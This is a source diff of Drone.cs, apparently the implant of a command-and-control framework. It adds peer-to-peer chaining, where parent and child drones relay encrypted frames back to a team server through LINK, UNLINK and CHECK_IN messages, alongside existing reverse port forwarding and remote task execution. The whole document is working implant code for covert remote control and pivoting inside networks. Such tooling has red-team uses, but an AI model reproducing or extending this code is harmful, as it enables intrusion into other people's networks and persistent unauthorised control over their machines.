@@ -11,16 +11,15 @@ using System.Threading.Tasks;
 
 using Drone.Commands;
 using Drone.CommModules;
-using Drone.Interfaces;
 
 namespace Drone;
 
 public sealed class Drone
 {
-    public IConfig Config { get; } = new Config();
+    public Config Config { get; } = new();
     
     private Metadata _metadata;
-    private ICommModule _commModule;
+    private CommModule _commModule;
     
     private readonly CancellationTokenSource _token = new();
 
@@ -30,7 +29,7 @@ public sealed class Drone
     private readonly List<ReversePortForwardState> _revPortForwardStates = new();
     private readonly Dictionary<string, ConcurrentQueue<byte[]>> _revPortForwardQueues = new();
 
-    private readonly List<ICommModule> _children = new();
+    private readonly Dictionary<string, P2PCommModule> _children = new();
 
     public async Task Run()
     {
@@ -42,13 +41,34 @@ public sealed class Drone
 
         // create comm module
         _commModule = GetCommModule();
-        _commModule.Init(_metadata);
+
+        switch (_commModule.Type)
+        {
+            case CommModule.ModuleType.EGRESS:
+                await RunAsEgressDrone();
+                break;
+            
+            case CommModule.ModuleType.P2P:
+                await RunAsP2PDrone();
+                break;
+            
+            default:
+                throw new ArgumentOutOfRangeException();
+        }
+    }
+
+    private async Task RunAsEgressDrone()
+    {
+        if (_commModule is not EgressCommModule commModule)
+            return;
+        
+        commModule.Init(_metadata);
         
         // run
         while (!_token.IsCancellationRequested)
         {
             // get frames
-            var inbound = await _commModule.ReadFrames();
+            var inbound = await commModule.CheckIn();
             
             // process them
             await HandleInboundFrames(inbound);
@@ -71,23 +91,46 @@ public sealed class Drone
         _token.Dispose();
     }
 
+    private async Task RunAsP2PDrone()
+    {
+        if (_commModule is not P2PCommModule commModule)
+            return;
+        
+        commModule.Init();
+        commModule.FrameReceived += HandleFrame;
+        
+        // this blocks until connected
+        await commModule.Start();
+        
+        // a peer has connected, send this metadata
+        var frame = new C2Frame(_metadata.Id, FrameType.CHECK_IN, Crypto.Encrypt(_metadata));
+        await commModule.SendFrame(frame);
+        
+        // drop into loop
+        await commModule.Run();
+    }
+
     private async Task HandleInboundFrames(IEnumerable<C2Frame> frames)
     {
         foreach (var frame in frames)
-        {
-            // if not for this drone, send to children
-            if (!frame.DroneId.Equals(_metadata.Id))
-            {
-                _children.ForEach(c => c.SendFrame(frame));
-                continue;
-            }
-            
             await HandleFrame(frame);
-        }
     }
 
     private async Task HandleFrame(C2Frame frame)
     {
+        // id is null on LINK frames
+        if (!string.IsNullOrWhiteSpace(frame.DroneId))
+        {
+            // if not for this drone, send to children
+            if (!frame.DroneId.Equals(_metadata.Id))
+            {
+                foreach (var kvp in _children.Where(child => child.Value.Running))
+                    await kvp.Value.SendFrame(frame);
+
+                return;
+            }
+        }
+
         switch (frame.Type)
         {
             case FrameType.CHECK_IN:
@@ -122,7 +165,19 @@ public sealed class Drone
                 
                 break;
             }
+
+            // new incoming link from parent
+            case FrameType.LINK:
+            {
+                var link = Crypto.Decrypt<LinkNotification>(frame.Data);
+                await HandleLinkNotification(link);
+                
+                break;
+            }
             
+            case FrameType.UNLINK:
+                break;
+                
             default:
                 throw new ArgumentOutOfRangeException();
         }
@@ -146,7 +201,7 @@ public sealed class Drone
         else await ExecuteTask(command, task);
     }
 
-    private async Task ExecuteTask(IDroneCommand command, DroneTask task)
+    private async Task ExecuteTask(DroneCommand command, DroneTask task)
     {
         try
         {
@@ -159,7 +214,7 @@ public sealed class Drone
         }
     }
 
-    private void ExecuteTaskThreaded(IDroneCommand command, DroneTask task)
+    private void ExecuteTaskThreaded(DroneCommand command, DroneTask task)
     {
         // create a new token
         var tokenSource = new CancellationTokenSource();
@@ -213,6 +268,66 @@ public sealed class Drone
         
         // cancel the token
         _taskTokens[taskId].Cancel();
+    }
+    
+    private async Task HandleLinkNotification(LinkNotification link)
+    {
+        // this is sent from the parent
+        // which means this is the child
+        link.ChildId = _metadata.Id;
+
+        // send to team server
+        await SendC2Frame(new C2Frame(_metadata.Id, FrameType.LINK, Crypto.Encrypt(link)));
+    }
+    
+    public async Task AddChildCommModule(string taskId, P2PCommModule commModule)
+    {
+        commModule.Init();
+        
+        commModule.FrameReceived += OnFrameReceivedFromChild;
+        commModule.OnException += async () =>
+        {
+            commModule.Stop();
+
+            var childId = _children.FirstOrDefault(kvp => kvp.Value == commModule).Key;
+            
+            // send an unlink
+            await SendC2Frame(new C2Frame(_metadata.Id, FrameType.UNLINK, Crypto.Encrypt(childId)));
+        };
+
+        // blocks until connected
+        await commModule.Start();
+        
+        // send a link frame to the child
+        var link = new LinkNotification(taskId, _metadata.Id);
+        var frame = new C2Frame(string.Empty, FrameType.LINK, Crypto.Encrypt(link));
+        await commModule.SendFrame(frame);
+
+        // add to the dict using the task id
+        _children.Add(taskId, commModule);
+        _ = commModule.Run();
+    }
+
+    private async Task OnFrameReceivedFromChild(C2Frame frame)
+    {
+        if (frame.Type == FrameType.LINK)
+        {
+            var link = Crypto.Decrypt<LinkNotification>(frame.Data);
+            
+            // we are the parent
+            if (link.ParentId.Equals(_metadata.Id))
+            {
+                // update key to the child metadata
+                if (_children.TryGetValue(link.TaskId, out var commModule))
+                {
+                    _children.Remove(link.TaskId);
+                    _children.Add(link.ChildId, commModule);
+                }
+            }
+        }
+        
+        // send it outbound
+        await SendC2Frame(frame);
     }
 
     private void HandleReversePortForwardPacket(ReversePortForwardPacket packet)
@@ -373,9 +488,19 @@ public sealed class Drone
         await SendC2Frame(frame);
     }
 
-    public async Task SendC2Frame(C2Frame frame)
+    private async Task SendC2Frame(C2Frame frame)
     {
-        await _commModule.SendFrame(frame);
+        // lol bit silly
+        switch (_commModule)
+        {
+            case EgressCommModule ecm:
+                await ecm.SendFrame(frame);
+                break;
+            
+            case P2PCommModule pcm:
+                await pcm.SendFrame(frame);
+                break;
+        }
     }
 
     private void LoadCommands()
@@ -415,8 +540,11 @@ public sealed class Drone
 
         // cancel main token
         _token.Cancel();
+        
+        if (_commModule is P2PCommModule commModule)
+            commModule.Stop();
     }
 
-    private static ICommModule GetCommModule()
+    private static CommModule GetCommModule()
         => new HttpCommModule();
 }
